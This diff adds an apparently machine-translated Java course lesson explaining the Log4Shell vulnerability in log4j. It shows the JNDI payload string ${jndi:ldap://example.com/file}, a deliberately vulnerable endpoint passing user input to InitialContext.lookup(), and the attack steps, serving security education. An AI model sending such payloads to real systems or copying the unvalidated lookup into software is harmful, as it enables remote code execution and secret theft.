@@ -1,0 +1,61 @@
+Log4Shell vulnerability
+<p>----------------------------------------</p>
+Scandal The scale of the disaster The most serious vulnerability in history The essence of the vulnerability Too smart library
+<p>----------------------------------------</p>
+<h2>7.1 Scandal</h2>
+<p>Of course we should talk about the story that happened quite recently - at the end of 2021.</p><img data-max-width="512" data-id="238b7e58-5875-420a-9102-a56730053634" alt="Log4Shell" src="https://cdn.javarush.com/images/article/238b7e58-5875-420a-9102-a56730053634/512.jpeg" style="width: 512px;">
+<p>The US Cybersecurity and Infrastructure Protection Agency (CISA) said the problem <code>Log4Shell</code>is one of the most serious vulnerabilities in history. Yes, we are talking about our favorite library <code>log4j</code>.</p>
+<p>Our cozy little library <code>log4j</code> <strong>and the biggest vulnerability in history</strong> ? Intrigued? Then listen.</p>
+<h2>7.2 Scale of the disaster</h2>
+<p>The discovery of a critical vulnerability <code>Log4Shell</code>(code CVE-2021-44228) was announced on December 9, 2021 by Lunasec security experts. Experts from the Apache Security Team Java community have verified this information and published a list of vulnerable Java libraries. The list was just huge.</p>
+<p>If a Java project used a library <code>log4j</code>, then it could be hacked fairly easily. And given that almost all server software is written in <code>Java</code>the <code>log4j</code>most popular java logger, according to security experts, the vulnerability affected 93% of corporate cloud environments. Including the likes of Amazon AWS, Microsoft Azure, Google Cloud, Cloudflare, iCloud, Minecraft, Steam and many more</p>
+<p>Moreover, the vulnerability affected not only server software, but also many Java applications, as well as hardware manufacturers. For example, Intel published a list of 32 hackable programs: SDKs, server maintenance systems, Linux tools.</p>
+<p>Nvidia also posted a security issue report mentioning DGX servers and NetQ tools. A number of updates were urgently released by Apple and Microsoft.</p>
+<p><span class="text-red">Roughly speaking, one line in the address bar of a student's browser puts the server if this line is eaten by the logger</span> (on many servers, everything is logged <code>HTTP-requestы</code>).</p>
+<p>After analyzing the code, it turned out that the vulnerability had been sitting in the library since 2013, but they noticed only now. And when they began to dig deeper, they discovered an abyss, the bottom of which is not visible at all.</p>
+<h2>7.3 The most serious vulnerability in history</h2>
+<p>Back in December 2021, the US Cybersecurity and Infrastructure Protection Agency (CISA) <a href="https://www.techradar.com/news/log4j-could-be-the-most-serious-threat-ever-seen-cisa-head-warns" target="_blank">stated</a> that <strong><code>Log4Shell</code>it is one of the most serious vulnerabilities in history</strong> .</p>
+<p>Many other experts express <a href="https://www.wired.com/story/log4j-log4shell-vulnerability-ransomware-second-wave/" target="_blank">a similar opinion</a> . Everyone knows about this vulnerability, and hackers of all ages are already using it to steal personal data and other types of attacks on various organizations. In the future, we are waiting for a wave of massive hacks and data leaks.</p>
+<p>The scale of the disaster can be gauged even by the fact that there is <a href="https://log4jmemes.com/" target="_blank">a separate site with memes about Log4j</a> , and every day there are new pictures.</p><img data-max-width="512" data-id="03e8d5ad-be1e-4b20-bfbb-3f432e694eea" alt="" src="https://cdn.javarush.com/images/article/03e8d5ad-be1e-4b20-bfbb-3f432e694eea/512.jpeg" style="width: 512px;">
+<p>This problem has been with us for a long time. A security hole in millions if not hundreds of millions of computer systems. All old software needs to be updated and at least replace this library there. But in most cases, no one even knows which libraries and which versions are used in their software.</p>
+<p>In general, we expect a sharp increase in the salaries of computer security specialists.</p>
+<h2>7.4 Nature of vulnerability</h2>
+<p>To understand the essence of the vulnerability, you need to understand how large server systems are arranged. Often such server applications are broken into different services that are located on different servers. And the JNDI service helps them interact.</p>
+<p><strong>Java Naming and Directory Interface (JNDI)</strong> is <code>Java API</code>to look up objects/services by name. These objects can be stored in various naming services or directories such as Remote Method Invocation (RMI), Common Object Request Broker Architecture (CORBA), Lightweight Directory Access Protocol (LDAP), or Domain Name Service (DNS).</p>
+<p>Working with it is very simple - it is a simple one <code>Java API</code>that takes only one string parameter - the name of the service. With it, you can contact any service and ask him to do something and / or send some data. For example, string <code>${jndi:ldap://example.com/file}</code>will load data from this <code>URL</code>specified in the string.</p>
+<p><span class="text-red">If the parameter comes from an untrusted source, it can lead to remote class loading and third-party code execution</span> . What happens in the case of <code>Log4j</code>. The attacker simply directs the victim's Java application to the malicious one <code>rmi/ldap/corba-server</code>and receives a malicious object in response.</p>
+<p>Technically, the problem here is not in <code>log4j</code>the library itself, but in the security settings when working with <code>JNDI-service</code>. You always need to check what kind of string we pass to <code>InitialContext.lookup()</code>.</p>
+<p>Vulnerable example <code>JNDI-applications</code>:</p>
+<pre class="line-numbers"><code>
+<span class="text-green">@RequestMapping("/lookup")
+@Example(uri = {"/lookup?name=java:comp/env"})</span>
+public Object lookup(<span class="text-green">@RequestParam</span> String name) throws Exception{
+   return new javax.naming.InitialContext().lookup(name);
+}
+</code></pre>
+<h2>7.5 Too smart of a library</h2>
+<p>And where <code>log4j</code>do you ask? The thing is that its developers wanted to make working with it as comfortable as possible and added smart logging to it. Here's how it works:</p>
+<p>It all started with the fact that log messages allowed you to set a template where data was substituted, for example:</p>
+<pre><code>
+log.debug(<span class="text-green">“User {user} has {count} friends”</span>, user, count);
+</code></pre>
+<p>The old version without data substitution looked like this:</p>
+<pre><code>
+log.debug( <span class="text-green">“User “+</span>user <span class="text-green">+” has “+</span> count <span class="text-green">+” friends”</span>);
+</code></pre>
+<p>In 2013, the substitution of smart prefixes specified by the view template was also added to the library <code>${prefix:name}</code>. For example, the string <code><span class="text-green">“${java:version}”</span></code>will be converted to <code><span class="text-green">«Java version 1.7.0_67»</span></code>. Oh how convenient.</p>
+<p>Among the recognized expressions are <code>${jndi:&lt;lookup&gt;}</code>where after the jndi protocol you can specify a search through <code>LDAP</code>: arbitrary <code>URL-address</code>can be queried and loaded as object data <code>Java</code>.</p>
+<p>This is a standard problem of the whole approach <code>JDK</code>: it automatically deserializes an object, a link to which can be set in the form of a url. In this case, not only the data of the object is loaded from the remote resource, but also the code of its class.</p>
+<p>The hack looks like this:</p>
+<ul>
+ <li>Downloading a file with malicious code</li>
+ <li>File contains serialized <code>Java an object</code>(and its class)</li>
+ <li>The class is loading<code>Java-machine</code></li>
+ <li>An object of a malicious class is created</li>
+ <li>The object's constructor is called</li>
+ <li>Both constructor and static initialization allow malicious class code to be executed</li>
+</ul>
+<p><code>log4j</code>If there is something like in the line that is being logged <code>${jndi:ldap://example.com/file}</code>, then <span class="text-red"><code>log4j</code>it will download data from this <code>URL-address</code>when connecting to the Internet</span> . By entering a string that is logged, an attacker can download and execute malicious code hosted on a public <code>URL-addressе</code>.</p>
+<p>Even if data execution is disabled, an attacker can obtain data, such as secret environment variables, by placing it in a <code>URL-addressе</code>, which will replace it and send it to the attacker's server.</p>
+<p>The good news is that <strong>the problem was quickly fixed in the library</strong> .</p>
+<p>The bad news is that <span class="text-red">millions of servers around the world are still running the old version of this library</span> ...</p>
